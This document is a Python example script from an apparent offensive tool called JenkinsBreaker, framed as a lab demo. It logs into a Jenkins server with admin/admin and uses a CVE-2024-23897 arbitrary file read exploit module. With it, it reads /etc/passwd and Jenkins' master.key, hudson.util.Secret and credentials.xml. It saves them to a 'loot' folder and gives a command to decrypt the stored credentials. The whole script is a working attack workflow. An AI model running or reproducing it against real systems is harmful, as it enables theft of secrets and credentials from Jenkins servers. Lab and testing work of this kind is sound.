#!/usr/bin/env python3
"""
Basic JenkinsBreaker Exploitation Example

Demonstrates:
- Creating a Jenkins session
- Running a single CVE exploit
- Extracting credentials
- Generating reports
"""

import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from exploits import ExploitRegistry

# Create global registry
exploit_registry = ExploitRegistry()


class JenkinsSession:
    """Minimal Jenkins session for exploitation."""
    def __init__(self, target_url, username=None, password=None, verify_ssl=False):
        import requests
        self.base_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.version = "Unknown"
        
        # Authenticate if credentials provided
        if username and password:
            login_url = f"{self.base_url}/j_security_check"
            self.session.post(login_url, data={
                'j_username': username,
                'j_password': password
            })
        
        # Get version
        try:
            response = self.session.get(f"{self.base_url}/api/json")
            if response.status_code == 200:
                data = response.json()
                self.version = data.get('version', 'Unknown')
        except:
            pass


def main():
    """Execute basic exploitation workflow against Jenkins Lab."""
    
    # Target configuration (Jenkins Lab)
    target_url = "http://localhost:8080"
    username = "admin"
    password = "admin"
    
    print("[*] JenkinsBreaker Basic Exploitation Example")
    print(f"[*] Target: {target_url}")
    print()
    
    # Step 1: Create Jenkins session
    print("[*] Step 1: Creating Jenkins session...")
    try:
        session = JenkinsSession(
            target_url=target_url,
            username=username,
            password=password,
            verify_ssl=False
        )
        print(f"[+] Session created successfully")
        print(f"[+] Jenkins version: {session.version}")
        print()
    except Exception as e:
        print(f"[-] Failed to create session: {e}")
        return 1
    
    # Step 2: List available exploits
    print("[*] Step 2: Discovering exploits...")
    exploit_registry.load_all_modules()
    available_modules = exploit_registry.list_modules()
    print(f"[+] Total exploits available: {len(available_modules)}")
    for module_info in available_modules[:5]:  # Show first 5
        print(f"    - {module_info['cve_id']}: {module_info['name']} ({module_info['severity']})")
    if len(available_modules) > 5:
        print(f"    ... and {len(available_modules) - 5} more")
    print()
    
    # Step 3: Run CVE-2024-23897 (CLI Arbitrary File Read)
    print("[*] Step 3: Exploiting CVE-2024-23897 (CLI Arbitrary File Read)...")
    cve = "CVE-2024-23897"
    
    try:
        exploit_module = exploit_registry.get_by_cve_id(cve)
        if not exploit_module:
            print(f"[-] Exploit {cve} not found")
            return 1
        
        # Read /etc/passwd
        print("[*] Reading /etc/passwd...")
        # Note: exploits.run() expects a tool object with session attribute
        # For this example, we'll create a wrapper
        class ToolWrapper:
            def __init__(self, session):
                self.session = session
                self.base_url = session.base_url
        
        tool = ToolWrapper(session)
        result = exploit_module.run(
            tool=tool,
            file_path="/etc/passwd"
        )
        
        if result.status == "success":
            print(f"[+] Exploit successful!")
            print(f"[+] File contents (first 500 chars):")
            print("-" * 60)
            if isinstance(result.data, dict) and "content" in result.data:
                content = result.data["content"]
                print(content[:500])
                if len(content) > 500:
                    print("... [truncated]")
            print("-" * 60)
        else:
            print(f"[-] Exploit failed: {result.details}")
            if result.error:
                print(f"[-] Error: {result.error}")
        print()
        
    except Exception as e:
        print(f"[-] Exploitation error: {e}")
        return 1
    
    # Step 4: Extract Jenkins secrets
    print("[*] Step 4: Extracting Jenkins secrets...")
    secrets = {
        "master.key": "/var/jenkins_home/secrets/master.key",
        "hudson.util.Secret": "/var/jenkins_home/secrets/hudson.util.Secret",
        "credentials.xml": "/var/jenkins_home/credentials.xml"
    }
    
    extracted = {}
    for name, path in secrets.items():
        print(f"[*] Extracting {name}...")
        try:
            result = exploit_module.run(tool=tool, file_path=path)
            if result.status == "success":
                print(f"[+] {name} extracted successfully")
                extracted[name] = result.data.get("content", "") if result.data else ""
            else:
                print(f"[-] Failed to extract {name}: {result.details}")
        except Exception as e:
            print(f"[-] Error extracting {name}: {e}")
    
    print()
    print(f"[+] Extracted {len(extracted)}/{len(secrets)} secrets")
    print()
    
    # Step 5: Save results
    print("[*] Step 5: Saving results...")
    output_dir = Path("./loot")
    output_dir.mkdir(exist_ok=True)
    
    for name, content in extracted.items():
        output_file = output_dir / name
        try:
            output_file.write_text(content if isinstance(content, str) else str(content))
            print(f"[+] Saved {name} to {output_file}")
        except Exception as e:
            print(f"[-] Failed to save {name}: {e}")
    
    print()
    print("[+] Exploitation complete!")
    print()
    print("Next steps:")
    print("  1. Review extracted files in ./loot/")
    print("  2. Use offsec-jenkins to decrypt credentials:")
    print("     cd ../offsec-jenkins")
    print("     python3 decrypt.py --key loot/secrets/master.key --secret loot/secrets/hudson.util.Secret --xml loot/credentials.xml")
    print()
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
